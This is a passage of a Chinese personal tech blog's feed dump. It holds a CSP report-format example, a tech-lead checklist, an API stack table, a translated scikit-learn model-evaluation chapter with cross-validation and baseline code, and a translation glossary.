http://reportcollector.example.com/collector.cgi</span><br></pre></td></tr></table></figure><p>浏览器会向 report-uri 中指定的地址使用 POST 发送一个 JSON 格式的数据包。</p><p>数据包格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"csp-report"</span>: &#123;</span><br><span class="line">    <span class="attr">"document-uri"</span>: <span class="string">"http://example.com/signup.html"</span>,</span><br><span class="line">    <span class="attr">"referrer"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"blocked-uri"</span>: <span class="string">"http://example.com/css/style.css"</span>,</span><br><span class="line">    <span class="attr">"violated-directive"</span>: <span class="string">"style-src cdn.example.com"</span>,</span><br><span class="line">    <span class="attr">"original-policy"</span>: <span class="string">"default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Teach Leader check list</title>
      <link href="/management/management/Tech%20leader%20check%20list/"/>
      <url>/management/management/Tech%20leader%20check%20list/</url>
      
        <content type="html"><![CDATA[<ul><li>使用C4模型绘制架构图</li><li>技术债图，管理项目技术债</li><li>依赖管理，管理项目依赖</li><li>风险管理</li><li>上线流程管理</li><li>干系人管理</li><li>影响力</li></ul>]]></content>
      
      
      <categories>
          
          <category> management </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API开发技术选型</title>
      <link href="/API-service/api/Api%20tech%20stack/"/>
      <url>/API-service/api/Api%20tech%20stack/</url>
      
        <content type="html"><![CDATA[<h3 id="Spring-boot-微服务"><a href="#Spring-boot-微服务" class="headerlink" title="Spring boot (微服务)"></a>Spring boot (微服务)</h3><ul><li>Spring boot  </li><li>Gradle  </li><li>H2 </li><li>JWT </li><li>GO</li><li>Hibernate </li><li>Groovy unit test</li><li>Spring contract </li><li>Spring cloud</li></ul><p>常用lib信息</p><table><thead><tr><th>包名</th><th style="text-align:center">用途</th><th style="text-align:right">环境</th></tr></thead><tbody><tr><td>Spring boot</td><td style="text-align:center">开发框架</td><td style="text-align:right">prod</td></tr><tr><td>Gradle</td><td style="text-align:center">构建工具</td><td style="text-align:right">dev</td></tr><tr><td>H2</td><td style="text-align:center">内存数据库</td><td style="text-align:right">dev</td></tr><tr><td>JWT</td><td style="text-align:center">TOKEN认证</td><td style="text-align:right">dev</td></tr><tr><td>GO</td><td style="text-align:center">持续集成平台</td><td style="text-align:right">dev</td></tr><tr><td>Hibernate</td><td style="text-align:center">数据库ORM</td><td style="text-align:right">dev</td></tr><tr><td>Groovy</td><td style="text-align:center">测试工具</td><td style="text-align:right">dev</td></tr><tr><td>Spring contract</td><td style="text-align:center">契约测试</td><td style="text-align:right">dev</td></tr></tbody></table><h3 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h3><ul><li>Nodejs </li><li>TypeScript </li><li>Koa/Express</li><li>Mongodb</li></ul>]]></content>
      
      
      <categories>
          
          <category> API&amp;service </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>模型评估</title>
      <link href="/translation/translation/%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0/"/>
      <url>/translation/translation/%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="11-0-简介"><a href="#11-0-简介" class="headerlink" title="11.0 简介"></a>11.0 简介</h2><p>在这一章中，我们将探讨评估策略，以此筛选通过我们机器学习算法创建的模型。在讨论怎么创建模型之前就讨论模型的评估，这看起来有点奇怪，但不失为一种大胆的方法。模型存在的意义是被用来做出高质量的预测，因此基本上来说，我们的目标不是创建模型（简单的），而是创建高质量的模型（困难的）。因此在我们毫无目标的在海量的机器学习算法中寻找之前，我们首先需要确定我们怎么去评估通过这些算法创建的模型。</p><h2 id="11-1-交互验证模型"><a href="#11-1-交互验证模型" class="headerlink" title="11.1 交互验证模型"></a>11.1 交互验证模型</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>你想要在真实世界中验证你的模型是否工作的足够好。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>创建一个预处理数据的流水线，训练这个模型，然后使用交互验证来评估：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Load libraries</span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> KFold, cross_val_score</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> make_pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="comment"># Load digits dataset</span></span><br><span class="line"></span><br><span class="line">digits = datasets.load_digits()</span><br><span class="line"><span class="comment"># Create features matrix</span></span><br><span class="line">features = digits.data</span><br><span class="line"><span class="comment"># Create target vector</span></span><br><span class="line">target = digits.target</span><br><span class="line"><span class="comment"># Create standardizer</span></span><br><span class="line">standardizer = StandardScaler()</span><br><span class="line"><span class="comment"># Create logistic regression object</span></span><br><span class="line">logit = LogisticRegression()</span><br><span class="line"><span class="comment"># Create a pipeline that standardizes, then runs logistic regression</span></span><br><span class="line">pipeline = make_pipeline(standardizer, logit)</span><br><span class="line"><span class="comment"># Create k-Fold cross-validation</span></span><br><span class="line">kf = KFold(n_splits=<span class="number">10</span>, shuffle=<span class="keyword">True</span>, random_state=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># Conduct k-fold cross-validation</span></span><br><span class="line">cv_results = cross_val_score(pipeline, <span class="comment"># Pipeline</span></span><br><span class="line"> features, <span class="comment"># Feature matrix</span></span><br><span class="line"> target, <span class="comment"># Target vector</span></span><br><span class="line"> cv=kf, <span class="comment"># Cross-validation technique</span></span><br><span class="line"> scoring=<span class="string">"accuracy"</span>, <span class="comment"># Loss function</span></span><br><span class="line"> n_jobs=<span class="number">-1</span>) <span class="comment"># Use all CPU scores</span></span><br><span class="line"><span class="comment"># Calculate mean</span></span><br><span class="line">cv_results.mean()</span><br><span class="line"><span class="number">0.96493171942892597</span></span><br></pre></td></tr></table></figure><h3 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h3><p>首先要考虑一点，评估监督学习模型可能表现的很直接：训练一个模型然后通过使用一些性能指标来计算它的表现（准确性、均方误差，等等）。然而这种方式有一个基本的缺陷。如果我们用我们的数据去训练一个模型，然后用同样的数据评估它的表现，这样达不到我们的验证目标。我们的目标不是在我们的训练数据上评估模型，而应该是用它从来没见过的数据来评估（比如，一个新的消费者、一次新的犯罪或者一张新的图片）。由于这些原因，我们的评估方法应该帮助我们去理解这些模型是否足够好的从未知数据中去做出预测。</p><p>其中一种策略可以是保留一部分数据用来测试模型。这种方法被称作校验法（或者叫留出法）。在实际验证中，我们把我们的采样数据（特征或者目标）分割成两部分，传统上我们叫它们训练集和测试集。我们取出测试集然后放到一边，假装我们从来没遇到过这些数据。下一步我们可以使用训练集来训练我们的模型，使用特征和目标向量来教会模型如何做出最好的预测。最终我们使用测试集来模拟从来没有遇到过的外部数据，来评估我们的模型训练结果。然而这种校验方法有两个主要的缺陷。首先，模型的性能高度依赖我们选出来作为测试集的采样数据。其次，模型没有被所有数据有效的训练，也没有被所有的有效数据校验。</p><p>一个更好的策略，被称作 k-fold 交叉验证（KFCV）的方法能够克服这些缺点。在KFCV中，我们分割这些数据为k组，我们叫它为叠。然后使用k-1叠数据来训练模型，然后用最后一叠做数据校验。我们通过重复K次，使得每一次都可以使用不同的叠作为测试数据来校验模型。我们取每一次模型被训练的结果来进行平均处理，然后得到一个整体的衡量结果。</p><p>在我们的方案中，应用KFCV思想，我们通过分割出10叠数据然后输出评估得分到变量 cv_results 中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># View score for all 10 folds</span></span><br><span class="line">cv_results</span><br><span class="line">array([ <span class="number">0.97222222</span>, <span class="number">0.97777778</span>, <span class="number">0.95555556</span>, <span class="number">0.95</span> , <span class="number">0.95555556</span>,</span><br><span class="line"> <span class="number">0.98333333</span>, <span class="number">0.97777778</span>, <span class="number">0.96648045</span>, <span class="number">0.96089385</span>, <span class="number">0.94972067</span>])</span><br></pre></td></tr></table></figure><p>当我们使用KFCV思想来训练模型时，这里有三个重要的关键点。首先KFCV假定每个采样数据是独立于其它采样创建的（例如，数据是独立同分布的[IID]）.<br>如果数据是满足IID原则，那么拆分数据叠的时候，打乱叠的顺序会是一个好主意。在 scikit-learn 中，我们可以设置变量 shuffle 为 true 来进行打乱操作。</p><p>其次，当我们使用 KFCV 来评估一个分类器时，它的优势在于粗略的对采样数据按照不同目标类以相同比例来划分叠（被称作分层 k-fold）。举个例子，如果我们目标矢量包含了性别并且80%的采样数据是男性，那么每个叠应该包含80%男性和20%的女性采样数据。<br>在 scikit-learn 框架中，我们能通过使用 StratifiedKFold 类替换 KFold，即可实现分层 k-fold 交叉验证。</p><p>最终当我们使用验证数据集或者交叉验证，最重要的是根据训练集去预处理数据，然后应用这些同样的处理方式到训练集和测试集。举例来说，当我们用 fit 操作我们的 standardization 对象和 standardizer 时，我们仅对训练集来计算平方差和方差。然后我们应用这些变换（使用transform 方法）对训练集和测试集都进行处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Import library</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="comment"># Create training and test sets</span></span><br><span class="line">features_train, features_test, target_train, target_test = train_test_split(</span><br><span class="line"> features, target, test_size=<span class="number">0.1</span>, random_state=<span class="number">1</span>)</span><br><span class="line"><span class="number">11.1</span> Cross-Validating Models | <span class="number">181</span></span><br><span class="line"><span class="comment"># Fit standardizer to training set</span></span><br><span class="line">standardizer.fit(features_train)</span><br><span class="line"><span class="comment"># Apply to both training and test sets</span></span><br><span class="line">features_train_std = standardizer.transform(features_train)</span><br><span class="line">features_test_std = standardizer.transform(features_test)</span><br></pre></td></tr></table></figure><p>这么做的原因是我们假装测试数据是未知的。如果我们使用来自训练集和测试集的采样数据对我们的预处理器 fit 操作，那么一些信息就会从测试集泄露进训练集。这个规则应用于任何预处理流程，例如特性选择。</p><p>当使用交叉验证技术时，scikit-learn 的 pipeline 包让这些变得非常简单。我们首先创建一个流水线去预处理这些数据（例如，standardizer） 然后训练这些我们的模型（逻辑回归，logit算法）:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Create a pipeline</span></span><br><span class="line">pipeline = make_pipeline(standardizer, logit)</span><br></pre></td></tr></table></figure><p>然后我们通过流水线来运行 KFCV 并且 scikit 帮我们昨晚所有的工作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Create a pipeline</span></span><br><span class="line">pipeline = make_pipeline(standardizer, logit)</span><br><span class="line">Then we run KFCV using that pipeline <span class="keyword">and</span> scikit does all the work <span class="keyword">for</span> us:</span><br><span class="line"><span class="comment"># Do k-fold cross-validation</span></span><br><span class="line">cv_results = cross_val_score(pipeline, <span class="comment"># Pipeline</span></span><br><span class="line"> features, <span class="comment"># Feature matrix</span></span><br><span class="line"> target, <span class="comment"># Target vector</span></span><br><span class="line"> cv=kf, <span class="comment"># Cross-validation technique</span></span><br><span class="line"> scoring=<span class="string">"accuracy"</span>, <span class="comment"># Loss function</span></span><br></pre></td></tr></table></figure><p>cross_val_score 方法需要三个参数，我们没有讨论但是这里值得一提，cv 决定我们的交叉验证技术。K-fold 是目前最通用的技术，但是还是有一些其他技术可以选择，比如创建和采样数据个数相同叠的 leave-one-out-cross-validation 。scoring 参数定义了我们对成功的衡量标准，我们将会在本章中其他小节大量讨论。最后，n_jobs=-1 是告诉 scikit-learn 去使用每一个可用的CPU核心。举例来说，如果你的计算机有四个核心（笔记本通常的配置），然后 scikit-learn 将使用四个全部核心来加速运行。</p><h3 id="查看更多"><a href="#查看更多" class="headerlink" title="查看更多"></a>查看更多</h3><ul><li>为什么数据科学家都应该知道交叉验证 (<a href="http://bit.ly/2Fzhz6X" target="_blank" rel="noopener">http://bit.ly/2Fzhz6X</a>)</li><li>交叉验证走在错误的道路上 (<a href="http://bit.ly/2FzfIiw" target="_blank" rel="noopener">http://bit.ly/2FzfIiw</a>)</li></ul><h2 id="11-2-创建一个基线回归模型"><a href="#11-2-创建一个基线回归模型" class="headerlink" title="11.2 创建一个基线回归模型"></a>11.2 创建一个基线回归模型</h2><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><p>你需要创建一个基线回归模型来和你的模型对比</p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p>使用 scikit-learn 的 DummyRegressor 来创建一个简单模型作为基准对比使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load libraries</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_boston</span><br><span class="line"><span class="keyword">from</span> sklearn.dummy <span class="keyword">import</span> DummyRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="comment"># Load data</span></span><br><span class="line">boston = load_boston()</span><br><span class="line"><span class="comment"># Create features</span></span><br><span class="line">features, target = boston.data, boston.target</span><br><span class="line"><span class="comment"># Make test and training split</span></span><br><span class="line">features_train, features_test, target_train, target_test = train_test_split(</span><br><span class="line"> features, target, random_state=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># Create a dummy regressor</span></span><br><span class="line">dummy = DummyRegressor(strategy=<span class="string">'mean'</span>)</span><br><span class="line"><span class="comment"># "Train" dummy regressor</span></span><br><span class="line">dummy.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Get R-squared score</span></span><br><span class="line">dummy.score(features_test, target_test)</span><br><span class="line"><span class="number">-0.0011193592039553391</span></span><br></pre></td></tr></table></figure><p>来对比，我们训练我们的模型然后进行性能评分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Load library</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="comment"># Train simple linear regression model</span></span><br><span class="line">ols = LinearRegression()</span><br><span class="line">ols.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Get R-squared score</span></span><br><span class="line">ols.score(features_test, target_test)</span><br><span class="line"><span class="number">0.63536207866746675</span></span><br></pre></td></tr></table></figure><h3 id="讨论-1"><a href="#讨论-1" class="headerlink" title="讨论"></a>讨论</h3><p>DummyRegressor 允许我们的创建一个非常简单的模型，用来作为基线参考，从而可以和我们的真实模型作为对比。在一个系统或者产品中，它是非常有用的去模拟一个原始存在的预测处理机制。举例来说，一个软件产品可能通过传统的方式被硬编码的方式编写了一些程序逻辑，根据用户特性，假定所有的用户将要在第一个月花费100美元。如果我们编写这个假设进入一个基线模型，我们能实实在在的看到机器学习技术被加入到软件中的优势。</p><p>DummyRegressor 使用 strategy 参数去设置做出预测的方法，包括在返回一个测试集中的均值或中值。此外，如果我们设置 strategy 参数为 constant 并且使用 constant 参数，DummyRegressor 会固定返回传给 constant 参数的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Create dummy regressor that predicts 20's for everything</span></span><br><span class="line">clf = DummyRegressor(strategy=<span class="string">'constant'</span>, constant=<span class="number">20</span>)</span><br><span class="line">clf.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Evaluate score</span></span><br><span class="line">clf.score(features_test, target_test)</span><br><span class="line"><span class="number">-0.065105020293257265</span></span><br></pre></td></tr></table></figure><p>顺带提一下性能得分的计算方法，默认情况下，返回的分值为测定结果（R-squared, <code>$R^2$</code>）得分的系数：</p><p>这里的 <code>$y_i$</code> 是目标采样数据为真的值，<code>$\hat{y_i}$</code> 为预测值， <code>$\overline{y}$</code> 为目标向量的平均值。</p><p><code>$R^2$</code> 越是趋近于1，说明在目标矢量中越多的变化越能被特征很好的解释。</p><p><code>$R^2 =  1-  \frac{ \sum(y_i-\hat{y_i}) }{\sum(y_i-\overline{y_i}) } $</code></p><h2 id="11-3-创建一个基线分类模型"><a href="#11-3-创建一个基线分类模型" class="headerlink" title="11.3 创建一个基线分类模型"></a>11.3 创建一个基线分类模型</h2><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><p>你需要一个简单的基线分类器去对比你的模型</p><h3 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h3><p>使用 scikit-learn 的 DummyClassifier</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Load libraries</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris</span><br><span class="line"><span class="keyword">from</span> sklearn.dummy <span class="keyword">import</span> DummyClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="comment"># Load data</span></span><br><span class="line">iris = load_iris()</span><br><span class="line"><span class="comment"># Create target vector and feature matrix</span></span><br><span class="line">features, target = iris.data, iris.target</span><br><span class="line"><span class="comment"># Split into training and test set</span></span><br><span class="line">features_train, features_test, target_train, target_test = train_test_split(</span><br><span class="line">features, target, random_state=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># Create dummy classifier</span></span><br><span class="line">dummy = DummyClassifier(strategy=<span class="string">'uniform'</span>, random_state=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># "Train" model</span></span><br><span class="line">dummy.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Get accuracy score</span></span><br><span class="line">dummy.score(features_test, target_test)</span><br><span class="line"><span class="number">0.42105263157894735</span></span><br></pre></td></tr></table></figure><p>通过把训练后的分类器和基线分类器进行对比，我们能看到这些提升:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load library</span></span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="comment"># Create classifier</span></span><br><span class="line">classifier = RandomForestClassifier()</span><br><span class="line"><span class="comment"># Train model</span></span><br><span class="line">classifier.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Get accuracy score</span></span><br><span class="line">classifier.score(features_test, target_test)</span><br><span class="line"><span class="number">0.94736842105263153</span></span><br></pre></td></tr></table></figure><h3 id="讨论-2"><a href="#讨论-2" class="headerlink" title="讨论"></a>讨论</h3><p>一个通常的做法去衡量分类器工作的有多好的方式是把它的结果和随机猜测对比。scikit-learn 的 DummyClassifier 让这项比较变得简单。</p><p>strategy 参数为我们生成值提供了大量选项。这里有两个特别有用的策略。 首先是 stratified 使做出的虚拟预测让目标矢量属性在训练集中成比例分布（例如，如果训练集中，20%的采样数据是女性，DummyClassifier 将当次预测出20%为女性。其次是 uniform，这种方式将生成预测均匀的在不同类中随机生成。举例来说，即使观察对象包含了20%的女性和80%的男性，uniform 将生成预测结果为50%的女性和50%的男性。</p><h3 id="查看更多-1"><a href="#查看更多-1" class="headerlink" title="查看更多"></a>查看更多</h3><ul><li>scikit-learn 文档：DummyClassifier (<a href="http://bit.ly/2Fr178G" target="_blank" rel="noopener">http://bit.ly/2Fr178G</a>)</li></ul><h2 id="11-4-评估二元分类器预测"><a href="#11-4-评估二元分类器预测" class="headerlink" title="11.4 评估二元分类器预测"></a>11.4 评估二元分类器预测</h2><h3 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h3><p>给定一个训练后的分类器模型，你需要评估它的质量</p><h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>当使用 scoring 参数来定义大量性能指标中的一个时，使用 scikit-learn 的 cross_val_score 去实现交叉验证，包括准确率，精确率，召回率，F值。</p><p>准确率是一个常用性能指标。它是简单的计算正确预测的采样数据比值。</p><p><code>$ Accuracy = \frac{TP + TN}{TP + TN + FP + FN} $</code></p><p>条件：</p><ul><li>TP是真阳性的采样数量，采样中具有正向类型的（患有疾病，购买了产品等等）并且我们的预测正确。</li><li>TN是真阴性的采样数量，采样中具有负向类型的（没有患有疾病，没有购买产品等等）并且我们预测正确。</li><li>FP是假阳性的采样数量，又被成为I型错误。采样中被预测为正向分类但是实际上为负向分类的。</li><li>FN是假阴性的采样数量，又被称为II型错误，采样中被预测为负向类型，但实际上为正向分类的。</li></ul><p>我们能通过设置scoring参数为accuracy来衡量accuracy在三个叠（默认数量）的交叉验证：</p>]]></content>
      
      
      <categories>
          
          <category> translation </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用翻译词汇定义</title>
      <link href="/translation/translation/vocabulary/"/>
      <url>/translation/translation/vocabulary/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://cwiki.apachecn.org/" target="_blank" rel="noopener">http://cwiki.apachecn.org/</a></p><p>## </p><ul><li>fold 叠 有些翻译为折</li><li>observation 采样数据，样本</li><li>hold-out 留出法</li><li>training set 训练集</li><li>Test set 测试集</li><li>target vector ⽬标向量</li><li>pipeline 流水线</li><li>preprocesses 预处理</li><li>logistic regression 逻辑回归</li><li>baseline 基线</li><li>See Also 查看更多</li><li>Accuracy 准确率 </li><li>Precision预测正率 </li><li>Recall 查对率</li><li>F1 F值</li><li>true positives 真正</li><li>true negatives 真负</li><li>mean value  均值 一组数据的总和除以这组数据个数所得到</li><li>median value 中值 将一组数据按大小顺序排列，处在最中间位置的一个数，左右各有50%数据</li><li>squared errors 均方误差</li><li>fit 拟合</li></ul><h2 id="不翻译"><a href="#不翻译" class="headerlink" title="不翻译"></a>不翻译</h2><ul><li>standardizer</li><li>n</li></ul>]]></content>
      
      
      <categories>
          
          <category> translation </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mac shortcuts</title>
      <link href="/development/tool-collections/shortcut%20for%20mac/"/>
      <url>/development/tool-collections/shortcut%20for%20mac/</url>
      
        <content type="html"><![CDATA[<p>bulgari.{buildNumber}.zip</p>]]></content>
      
      
      <categories>
          
          <category> development </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Model Evaluation</title>
      <link href="/translation/translation/Model%20Evaluation/"/>
      <url>/translation/translation/Model%20Evaluation/</url>
      
        <content type="html"><![CDATA[<h2 id="11-0-Introduction"><a href="#11-0-Introduction" class="headerlink" title="11.0 Introduction"></a>11.0 Introduction</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>In this chapter we will examine strategies for evaluating the quality of models created<br>through our learning algorithms. It might appear strange to discuss model evaluation<br>before discussing how to create them, but there is a method to our madness. Models<br>are only as useful as the quality of their predictions, and thus fundamentally our goal<br>is not to create models (which is easy) but to create high-quality models (which is<br>hard). Therefore, before we explore the myriad learning algorithms, we first set up<br>how we can evaluate the models they produce.</p><p>在这一章中，我们将探讨评估策略，以此筛选通过我们学习算法创建的模型。在讨论怎么创建模型之前就讨论模型的评估，这看起来有点奇怪，但不失为一种大胆的方法。模型存在的意义是被用来做出高质量的预测，因此基本上来说，我们的目标不是创建模型（简单的），而是创建高质量的模型（困难的）。因此在我们毫无目标的在海量的学习算法中寻找之前，我们首先需要确定我们怎么去评估通过这些算法创建的模型。</p><h2 id="11-1-Cross-Validating-Models"><a href="#11-1-Cross-Validating-Models" class="headerlink" title="11.1 Cross-Validating Models"></a>11.1 Cross-Validating Models</h2><h2 id="11-1-交互验证模型"><a href="#11-1-交互验证模型" class="headerlink" title="11.1 交互验证模型"></a>11.1 交互验证模型</h2><h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>You want to evaluate how well your model will work in the real world.</p><p>你想要在真实世界中验证你的模型工作的足够好。</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>Create a pipeline that preprocesses the data, trains the model, and then evaluates it<br>using cross-validation:</p><p>创建一个预处理数据的流水线，训练这个模型，然后使用交互验证来评估：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Load libraries</span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> KFold, cross_val_score</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> make_pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="comment"># Load digits dataset</span></span><br><span class="line"></span><br><span class="line">digits = 